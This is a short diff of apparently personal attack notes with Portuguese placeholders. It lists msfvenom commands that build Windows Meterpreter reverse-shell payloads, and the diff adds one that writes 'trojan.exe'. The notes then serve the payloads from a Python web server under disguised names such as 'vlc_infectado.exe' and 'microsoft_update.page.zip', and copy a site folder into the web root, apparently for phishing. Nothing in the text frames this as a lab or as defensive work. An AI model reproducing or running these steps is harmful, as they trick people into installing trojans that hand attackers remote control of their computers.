@@ -6,6 +6,9 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<seu_ip> LPORT=443 -f ex
 
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1
 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > trojan.exe
+
+
 python3 -m http.server 8080
 
 http://192.168.1.137:8080/vlc_infectado.exe
@@ -16,12 +19,5 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 
 
 sudo apt install kali-linux-large virtualbox-guest-x11 build-essential -y
-
-
-
-sudo apt update
-sudo apt install apache2 php libapache2-mod-php -y
-sudo systemctl restart apache2
-
 
 sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/
